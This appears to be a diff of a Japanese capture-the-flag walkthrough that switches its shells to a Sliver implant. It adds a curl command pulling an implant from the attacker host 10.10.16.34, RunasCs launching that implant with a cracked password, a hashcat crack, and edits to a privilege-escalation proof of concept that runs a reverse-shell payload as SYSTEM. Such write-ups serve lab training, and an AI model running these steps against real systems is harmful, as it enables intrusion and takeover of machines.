@@ -356,6 +356,10 @@ generate --mtls 10.10.16.34 --save . --os windows
 
 インプラントをターゲットマシンにアップロードします。
 
+```powershell
+curl 10.10.16.34/CONTINUOUS_WAMPUM.exe -o CONTINUOUS_WAMPUM.exe
+```
+
 ![image-20241214002105492](screenshot/image-20241214002105492.png)
 
 アップロードが完了するとSliverでサーバーを起動して、インプラントを実行するとシェルを操作できるようになります。
@@ -434,7 +438,7 @@ sha256:50000:In2HPMqJEDzYOpdr2sUkhg==:l5BygNwk/lF8Q0db0hi/rVbCXU0RA32LbaRA79TWka
 
 入力できたらhashcatを走らせます。
 
-```
+```bash
 hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
@@ -442,29 +446,25 @@ hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt
 
 ![image-20241118235540653](screenshot/image-20241118235540653.png)
 
-このパスワードでRunasCsを使用して `emily` のシェルを取得します。
+## user.txt
 
-msfvenomでペイロードを作成してアップロードします。
+このパスワードでRunasCsを使用して `emily` としてインプラント実行することでemilyのセッションをつくります。
 
-![image-20241214002420968](screenshot/image-20241214002420968.png)
+まず、RunasCs.exeをアップロードします。
 
-RunasCsもアップロードします。
+![image-20241214101604401](screenshot/image-20241214101604401.png)
 
-![image-20241214002559365](screenshot/image-20241214002559365.png)
-
-ペイロードアップロードできたらリスナーを起動してRunasCsでemilyとしてpayload.exeを実行します。このとき実行するペイロードは絶対パスで指定してあげます。
+アップロードができたら以下のコマンドを実行します。このとき絶対パスでインプラントを指定する必要があります。
 
 ```powershell
-./RunasCs.exe emily 12345678 C:\temp\payload.exe
+./RunasCs.exe emily 12345678 C:\temp\CONTINUOUS_WAMPUM.exe
 ```
 
-emilyとしてシェルを取得することができました。
+![image-20241214101437241](screenshot/image-20241214101437241.png)
 
-![image-20241213235225934](screenshot/image-20241213235225934.png)
+sliver側で応答が得られ、emilyのセッションを作ることができました。
 
-sliverのインプラントを実行してemilyのセッションを作ります。
-
-![image-20241214003022625](screenshot/image-20241214003022625.png)
+![image-20241214101352815](screenshot/image-20241214101352815.png)
 
 user.txtを取得しました。つづいてAdministratorを目指します。
 
@@ -502,15 +502,21 @@ PoCがないか調べてみたところGitHubに以下のPoCを見つけた
 
 リポジトリをVisual Studioでクローンする
 
-ソースファイルの 4行目に `VSDiagnostics.exe` のパスがあるのでターゲットマシン上のパスと同じになるように変更する
+ソースファイルの 4行目に `VSDiagnostics.exe` のパスを指定しているのでターゲットマシン上のパスと同じになるように変更します。
+
+変更前
+
+```c++
+WCHAR cmd[] = L"C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Team Tools\\DiagnosticsHub\\Collector\\VSDiagnostics.exe";
+```
+
+変更後
 
 ```c++
 WCHAR cmd[] = L"C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\Team Tools\\DiagnosticsHub\\Collector\\VSDiagnostics.exe";
 ```
 
 ソースファイルの187行目の `C:\windows\system32\cmd.exe` をリバースシェルペイロードに変更する
-
-emilyのシェルを取得した際のペイロードを使います。
 
 変更前
 
@@ -528,17 +534,21 @@ CopyFile(L"c:\\temp\\payload.exe", L"C:\\ProgramData\\Microsoft\\VisualStudio\\S
 
 ![](screenshot/image-20240809170955104.png)
 
-![image-20241214003205162](screenshot/image-20241214003205162.png)
+新しいインプラント作成し、`C:\temp`にアップロードします。main.cppの187行目で指定したペイロードと同じ名前で作成します。
 
-リスナーを起動し、PoCを実行します。
+![image-20241214104440610](screenshot/image-20241214104440610.png)
 
-![image-20241214003421915](screenshot/image-20241214003421915.png)
+アップロードができたらexecuteコマンドでPoCを実行します。
 
-SYSTEM権限のシェルを取得することができました。
+![image-20241214100324007](screenshot/image-20241214100324007.png)
 
-![image-20241213233454769](screenshot/image-20241213233454769.png)
+SYSTEM権限のセッションを取得することができました。
+
+## root.txt
 
 root.txtを取得して終了です。
 
-![image-20241213233545840](screenshot/image-20241213233545840.png)
+![image-20241214100428435.png](screenshot/image-20241214100428435.png)
+
+
 
